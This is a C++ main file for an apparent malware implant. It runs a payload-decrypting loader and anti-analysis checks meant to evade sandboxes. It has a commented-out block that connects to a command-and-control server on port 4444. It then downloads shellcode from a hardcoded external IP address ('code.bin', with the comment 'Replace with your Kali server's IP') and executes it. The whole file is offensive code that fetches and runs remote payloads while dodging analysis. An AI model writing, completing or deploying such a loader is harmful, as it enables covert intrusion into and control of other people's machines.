#include <iostream>
#include "ABCsync.h"
#include "ABCloader.h"
#include "AntiAnalysis.h"
#include "ShellcodeLoader.h"  // Include the shellcode loader

int main() {
    // Initialize the loader to decrypt and load the payload
    ABCloader loader;
    std::cout << "[*] Running ABCloader..." << std::endl;
    loader.runLoader();

    // Start anti-analysis techniques (screen resolution, process count, etc.)
    AntiAnalysis antiAnalysis;
    std::cout << "[*] Running anti-analysis techniques..." << std::endl;
    if (!antiAnalysis.checkScreenResolution() || !antiAnalysis.checkProcessCount()) {
        std::cerr << "[!] Anti-analysis check failed. Exiting..." << std::endl;
        return 1;
    }

    // // Connect to the C2 server and listen for commands
    // ABCsync syncPayload;
    // std::string c2Address = ";  // Example C2 address
    // int c2Port = 4444;  // Example C2 port

    // std::cout << "[*] Connecting to C2 server at " << c2Address << ":" << c2Port << std::endl;
    // if (!syncPayload.connectToC2(c2Address, c2Port)) {
    //     std::cerr << "[!] Failed to connect to C2 server." << std::endl;
    //     return 1;
    // }

    // *** ShellcodeLoader Usage ***
    std::string shellcodeURL = "http://18.222.233.46:80/code.bin";  // Replace with your Kali server's IP and shellcode URL
    ShellcodeLoader shellcodeLoader(shellcodeURL);

    if (!shellcodeLoader.downloadShellcode()) {
        std::cerr << "[!] Failed to download shellcode." << std::endl;
        return 1;
    }

    if (!shellcodeLoader.executeShellcode()) {
        std::cerr << "[!] Failed to execute shellcode." << std::endl;
        return 1;
    }

    std::cout << "[*] Completed execution." << std::endl;
    return 0;
}
